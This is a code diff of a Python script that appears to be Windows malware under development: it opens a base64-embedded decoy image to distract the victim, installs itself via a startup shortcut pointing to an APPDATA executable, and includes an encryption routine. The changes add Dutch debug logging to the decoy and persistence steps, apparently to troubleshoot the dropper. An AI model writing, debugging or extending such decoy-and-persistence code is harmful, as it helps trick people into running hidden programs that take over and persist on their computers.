@@ -39,13 +39,23 @@ def is_installed():
     return os.path.exists(APPDATA_EXE)
 
 def open_decoy():
+    log_path = os.path.join(os.environ.get('USERPROFILE', 'C:/Users/rub'), 'Desktop', 'decoy_log.txt')
+    log = open(log_path, 'w')
     try:
-        path = tempfile.mktemp(suffix=".avif")
-        with open(path, "wb") as f:
-            f.write(base64.b64decode(_DECOY_B64))
-        os.startfile(path)
-    except Exception:
-        pass
+        log.write('stap1: start' + chr(10))
+        p = tempfile.mktemp(suffix='.avif')
+        log.write('stap2: p=' + p + chr(10))
+        data = base64.b64decode(_DECOY_B64)
+        log.write('stap3: decoded ' + str(len(data)) + ' bytes' + chr(10))
+        with open(p, 'wb') as f:
+            f.write(data)
+        log.write('stap4: bestand geschreven' + chr(10))
+        os.startfile(p)
+        log.write('stap5: startfile gedaan' + chr(10))
+    except Exception as e:
+        log.write('FOUT: ' + str(e) + chr(10))
+    finally:
+        log.close()
 
 def persist_startup():
     try:
@@ -58,8 +68,8 @@ def persist_startup():
             lnk = shell.CreateShortcut(STARTUP_LNK)
             lnk.TargetPath = APPDATA_EXE
             lnk.Save()
-    except Exception:
-        pass
+    except Exception as e:
+        open(os.path.join(os.environ.get("TEMP","C:/Temp"),"decoy_err.txt"),"w").write(str(e))
 
 def encrypt(data: bytes) -> bytes:
     iv = get_random_bytes(16)
@@ -129,3 +139,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
